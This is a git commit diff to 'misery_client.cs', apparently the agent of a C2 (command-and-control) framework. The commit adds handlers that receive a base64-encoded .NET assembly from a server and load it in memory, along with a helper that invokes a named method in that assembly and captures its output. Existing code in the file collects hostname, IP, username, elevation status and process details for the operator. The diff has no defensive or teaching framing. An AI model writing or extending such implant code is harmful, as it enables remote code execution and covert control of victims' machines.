2b555356a084b625311f167d18c2eaf5f1290324
kevin <kevin@henpeebin.com>
2022-04-10 18:51:02 -0500

    added load/invoke agent code for .net assemblies

--- agent/core/misery_client.cs
+++ agent/core/misery_client.cs
@@ -16,9 +16,9 @@ using System.Runtime.InteropServices;
 namespace ConsoleApp1
 {
     
-    class Program
+    public class Program
     {
-        static void Main(string[] args)
+        public static void Main(string[] args)
         {
             if (args.Length > 1)
             {
@@ -39,10 +39,37 @@ namespace ConsoleApp1
             string id = Guid.NewGuid().ToString();
 
             // register all of the commands
+            // Client echo
             client.On("echo", response =>
             {
                 Console.WriteLine(response.ToString());
                 client.EmitAsync("echo", response.ToString());
+            });
+
+            // Client load .NET assembly (dll) // TODO: Wire this into the server
+            client.On("load", response =>
+            {
+                try
+                {
+                    Assembly assembly = Assembly.Load(Convert.FromBase64String(response.GetValue<string>()));
+                    client.EmitAsync("echo", "Loaded " + assembly.FullName);
+                }
+                catch (Exception e)
+                {
+                    client.EmitAsync("echo", "Load failed!\n\n" + e.Message);
+                }
+            });
+
+            // Client invoke loaded assembly (.NET DLL) // TODO: Wire this into the server, send output
+            client.On("run", response =>
+            {
+                string[] args = response.GetValue<string[]>();
+                Console.WriteLine("Debg: args: ");
+                foreach (string arg in args)
+                {
+                    Console.WriteLine(arg);
+                }
+                //(object obj, string output) = Invoke(args);
             });
 
             // add an event that happens when we first connect
@@ -53,6 +80,50 @@ namespace ConsoleApp1
 
             // finally, connect to the server and start the party
             await client.ConnectAsync();
+        }
+        static (object, string) Invoke(string assemblyName, string[] args, string methodName = "Run")
+        {
+            Assembly GetAssemblyByName(string name)
+            {
+                return AppDomain.CurrentDomain.GetAssemblies().
+                       SingleOrDefault(_ => _.GetName().Name == name);
+            }
+
+            Assembly assembly = GetAssemblyByName(assemblyName);
+            Console.WriteLine("Debug: " + assembly.FullName);
+            Type[] types = assembly.GetExportedTypes();
+            object methodOutput;
+            foreach (Type type in types)
+            {
+                foreach (MethodInfo method in type.GetMethods())
+                {
+                    if (method.Name == methodName)
+                    {
+                        //Redirect output from C# assembly (such as Console.WriteLine()) to a variable instead of screen
+                        TextWriter prevConOut = Console.Out;
+                        var sw = new StringWriter();
+                        Console.SetOut(sw);
+
+                        object instance = Activator.CreateInstance(type);
+                        if (args.Length == 0)
+                        {
+                            methodOutput = method.Invoke(instance, new object[] { new string[0] }); // empty arguments
+                        }
+                        else
+                        {
+                            methodOutput = method.Invoke(instance, new object[] { args });
+                        }
+
+                        //Restore output -- Stops redirecting output
+                        Console.SetOut(prevConOut);
+                        string strOutput = sw.ToString();
+
+                        return (methodOutput, strOutput);
+                    }
+                }
+
+            }
+            return (null, null); // No methodOutput or string output
         }
         public static string GetLocalIPAddress()
         {
@@ -77,7 +148,7 @@ namespace ConsoleApp1
             string elevated = AmIHigh() ? "*" : "";
             string username = elevated + WindowsIdentity.GetCurrent().Name;
             string pid = Process.GetCurrentProcess().Id.ToString();
-            string process = Process.GetCurrentProcess().ProcessName;
+            string process = Process.GetCurrentProcess().MainModule.FileName;
             string pwd = Directory.GetCurrentDirectory();
 
             return new { id, hostname, ipaddr, username, pid, process, pwd };
